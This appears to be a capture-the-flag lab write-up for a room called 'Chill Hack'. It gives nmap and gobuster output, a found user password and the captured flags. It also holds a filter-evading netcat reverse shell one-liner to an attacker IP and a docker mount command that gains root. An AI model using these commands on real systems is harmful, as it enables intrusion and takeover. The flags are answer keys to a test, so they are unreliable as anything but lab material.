Chill_Hack.doc
------------------


Nmap Results:
------------------
nmap -sC -sV 10.10.180.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 11:15 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 76.30% done; ETC: 11:15 (0:00:01 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 11:15 (0:00:03 remaining)
Nmap scan report for 10.10.180.242
Host is up (0.084s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.26.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds

FTP Anonymous Note.txt :
---------------------------------
Anurodh told me that there is some filtering on strings being put in the command -- Apaar


Gobuster :
----------------
gobuster dir -u http://10.10.180.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt            
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.180.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/15 11:17:16 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.180.242/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.180.242/css/]   
/js                   (Status: 301) [Size: 311] [--> http://10.10.180.242/js/]    
/fonts                (Status: 301) [Size: 314] [--> http://10.10.180.242/fonts/] 
/secret               (Status: 301) [Size: 315] [--> http://10.10.180.242/secret/]
Progress: 93246 / 220561 (42.28%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2022/09/15 11:31:13 Finished
===============================================================

Users Found :
--------------------
anurodh: !d0ntKn0wmYp@ssw0rd
apaar: no need
aurick: no need

revese shell syntax:
---------------------------
r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.26.95 9799 >/tmp/f

GTFobin For Root in Docker:
-----------------------------
./docker run -v /:/mnt --rm -it alpine chroot /mnt sh

--------------------
Flags Found!
--------------------
User Flag : {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
Root Flag : {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}